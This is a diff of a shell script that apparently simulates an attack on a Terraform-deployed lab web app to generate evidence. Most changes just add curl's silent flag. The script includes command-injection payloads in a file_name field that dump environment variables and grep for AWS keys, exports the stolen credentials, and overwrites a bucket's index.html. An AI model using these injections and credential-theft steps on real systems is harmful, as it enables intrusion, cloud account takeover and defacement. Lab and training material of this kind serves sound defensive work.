@@ -5,17 +5,17 @@ cd /home/cloudshell-user/evidence-app
 TARGET=$(terraform output | cut -d '"' -f2)
 
 echo -e "\033[32mVisiting page like a browser...\033[0m"
-curl $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
 
 sleep 5
 
 echo -e "\033[32mUploading file like a browser...\033[0m"
-curl -XPOST $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d '{"file_name":"sample.txt","file_data":"dGVzdAo="}' >/dev/null
-curl $TARGET/api/ -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s -XPOST $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d '{"file_name":"sample.txt","file_data":"dGVzdAo="}' >/dev/null
+curl -s $TARGET/api/ -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
 
 sleep 5
 
@@ -27,30 +27,30 @@ wget --spider --force-html --span-hosts --user-agent="TotallyNotWget" \
 sleep 5
 
 echo -e "\033[32mReviewing script.js...\033[0m"
-curl $TARGET/script.js >/dev/null
+curl -s $TARGET/script.js >/dev/null
 sleep 2
-curl $TARGET/script.js >/dev/null
+curl -s $TARGET/script.js >/dev/null
 
 sleep 5
 
 echo -e "\033[32mCommunicating with /api/...\033[0m"
-curl $TARGET/api/ >/dev/null
+curl -s $TARGET/api/ >/dev/null
 sleep 2
-curl -X POST $TARGET/api/ >/dev/null
+curl -s -X POST $TARGET/api/ >/dev/null
 
 sleep 5
 
 echo -e "\033[32mGrabbing headers...\033[0m"
-curl --head $TARGET >/dev/null
+curl -s --head $TARGET >/dev/null
 sleep 2
-curl --head $TARGET/api/ >/dev/null
+curl -s --head $TARGET/api/ >/dev/null
 
 echo -e "\033[32mVisiting page like a browser (again)...\033[0m"
-curl $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
 
 sleep 5
 
@@ -60,13 +60,13 @@ echo -e "\033[32mFuzzing App...\033[0m"
 sleep 5
 
 echo -e "\033[32mSteal credentials...\033[0m"
-curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+curl -s -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
   -d '{"file_name":";env;","file_data":"dGVzdAo="}' >/dev/null
 sleep 2
-curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+curl -s -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
   -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}' >/dev/null
 sleep 2
-curl $TARGET/api/ >/dev/null
+curl -s $TARGET/api/ >/dev/null
 sleep 2
 export AWS_ACCESS_KEY_ID=$(curl -s $TARGET/api/ | egrep -o "AWS_ACCESS_KEY_ID=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2)
 export AWS_SECRET_ACCESS_KEY=$(curl -s $TARGET/api/ | egrep -o "AWS_SECRET_ACCESS_KEY=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)
@@ -112,10 +112,10 @@ aws s3 cp /tmp/index.html s3://$WEBCODE_BUCKET/index.html >/dev/null
 sleep 5
 
 echo -e "\033[32mVisiting page like a browser (last time)...\033[0m"
-curl $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
-curl $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/styles.css -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/script.js -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/Cloud_Ace_Final.png -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
+curl -s $TARGET/favicon.ico -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" >/dev/null
 
 exit 0
